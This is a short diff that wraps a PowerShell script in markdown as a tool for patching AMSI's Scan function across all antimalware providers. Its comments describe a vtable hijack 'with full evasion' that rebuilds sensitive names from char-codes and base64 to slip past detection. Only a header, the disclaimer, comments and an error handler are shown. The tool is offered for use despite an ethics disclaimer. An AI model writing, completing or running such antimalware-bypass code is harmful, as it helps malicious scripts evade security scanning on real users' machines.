@@ -1,3 +1,10 @@
+# Patching AMSI AntimalwareScanInterface::Scan for all Amsi Providers #
+
+```batch
+P.S Please do not use in unethical hacking and follow all rules and regulations of laws
+```
+
+```powershell
 # Provider-targeted vtable hijack with full evasion.
 # All sensitive identifiers reconstructed at runtime: AMSI key name from char-codes,
 # Win32 / Marshal method names from base64, delegate attribute from string concat.
@@ -202,3 +209,4 @@ foreach ($g in $guids) {
         Write-Warning ("provider error: {0}" -f $_.Exception.Message)
     }
 }
+```
